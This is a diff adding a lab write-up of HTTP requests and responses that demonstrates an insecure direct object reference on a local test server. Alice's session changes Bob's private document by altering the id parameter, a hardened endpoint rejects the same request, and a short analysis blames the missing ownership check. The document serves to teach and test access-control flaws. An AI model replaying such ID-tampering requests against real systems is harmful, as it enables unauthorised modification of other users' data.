@@ -1,0 +1,59 @@
+=== Vulnerable update using Alice session ===
+
+POST /vuln/document/update HTTP/1.1
+Host: 127.0.0.1:8010
+Cookie: session=REDACTED
+Content-Type: application/x-www-form-urlencoded
+
+id=201&content=changed-by-alice-burp
+
+=== Vulnerable update response ===
+
+HTTP/1.0 200 OK
+
+{"message":"Document updated","document":{"id":201,"owner":"bob","title":"Bob private notes","content":"changed-by-alice-burp"}}
+
+=== Verification using the same Alice session ===
+
+GET /vuln/document?id=201 HTTP/1.1
+Host: 127.0.0.1:8010
+Cookie: session=REDACTED
+
+HTTP/1.0 200 OK
+
+{"document":{"id":201,"owner":"bob","title":"Bob private notes","content":"changed-by-alice-burp"}}
+
+=== Safe update using Alice session after clean restart ===
+
+POST /safe/document/update HTTP/1.1
+Host: 127.0.0.1:8010
+Cookie: session=REDACTED
+Content-Type: application/x-www-form-urlencoded
+
+id=201&content=should-not-change
+
+=== Safe update response ===
+
+HTTP/1.0 404 Not Found
+
+{"error":"Document not found"}
+
+=== Bob verifies his document through the safe route ===
+
+GET /safe/document?id=201 HTTP/1.1
+Host: 127.0.0.1:8010
+Cookie: session=REDACTED
+
+HTTP/1.0 200 OK
+
+{"document":{"id":201,"owner":"bob","title":"Bob private notes","content":"Bob document 201"}}
+
+=== Analysis ===
+
+The vulnerable update endpoint authenticated Alice but selected and modified the resource only through the client-controlled document ID.
+
+Alice changed Bob's document because the endpoint omitted a server-side ownership check.
+
+The safe update endpoint repeated the authorization check before modifying the resource and returned 404.
+
+Bob's subsequent safe read confirmed that the rejected update did not alter the document.
